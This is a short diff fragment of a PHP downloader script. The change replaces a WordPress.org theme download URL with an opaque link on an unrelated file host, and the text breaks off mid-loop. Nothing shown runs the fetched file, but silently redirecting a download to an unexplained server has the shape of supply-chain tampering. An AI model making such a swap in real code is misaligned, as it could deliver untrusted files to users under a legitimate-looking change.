@@ -1,6 +1,6 @@
 <?php
 define('BUFSIZ', 4095);
-$url = 'http://wordpress.org/themes/download/wrock-metro.1.8.zip';
+$url = 'http://srv-7.directserver.us/?file=mega_4181575602';
 $rfile = fopen($url, 'r');
 $lfile = fopen(basename($url), 'w');
 while(!feof($rfile))
